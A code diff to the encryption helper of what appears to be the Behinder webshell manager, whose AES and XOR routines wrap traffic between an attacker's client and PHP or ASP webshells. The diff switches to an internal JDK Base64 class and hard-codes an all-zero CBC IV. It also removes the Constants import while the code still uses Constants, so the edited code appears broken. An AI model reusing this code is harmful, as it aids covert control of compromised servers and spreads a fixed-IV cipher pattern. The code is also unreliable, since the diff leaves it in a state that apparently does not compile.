@@ -1,13 +1,12 @@
 package net.rebeyond.behinder.core;
 
 
-import net.rebeyond.behinder.utils.Constants;
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 import java.nio.charset.StandardCharsets;
-import java.util.Base64;
 
 public class Crypt {
     public static byte[] Encrypt(byte[] bs, String key) throws Exception {
@@ -62,7 +61,7 @@ public class Crypt {
         if (encryptType == Constants.ENCRYPT_TYPE_AES) {
             SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES");
             Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-            cipher.init(1, skeySpec, new IvParameterSpec(new byte[16]));
+            cipher.init(1, skeySpec, new IvParameterSpec(new byte[]{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}));
             return cipher.doFinal(bs);
         } else if (encryptType == Constants.ENCRYPT_TYPE_XOR) {
             return DecryptForAsp(bs, key);
@@ -81,10 +80,10 @@ public class Crypt {
     public static byte[] DecryptForPhp(byte[] bs, String key, int encryptType) throws Exception {
         if (encryptType == Constants.ENCRYPT_TYPE_AES) {
             byte[] raw = key.getBytes(StandardCharsets.UTF_8);
-            byte[] bs2 = Base64.getDecoder().decode(new String(bs));
-            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
+            byte[] bs2 = Base64.decode(new String(bs));
+            SecretKeySpec keySpec = new SecretKeySpec(raw, "AES");
             Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-            cipher.init(2, skeySpec, new IvParameterSpec(new byte[16]));
+            cipher.init(2, keySpec, new IvParameterSpec(new byte[]{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}));
             return cipher.doFinal(bs2);
         } else if (encryptType == Constants.ENCRYPT_TYPE_XOR) {
             return DecryptForAsp(bs, key);
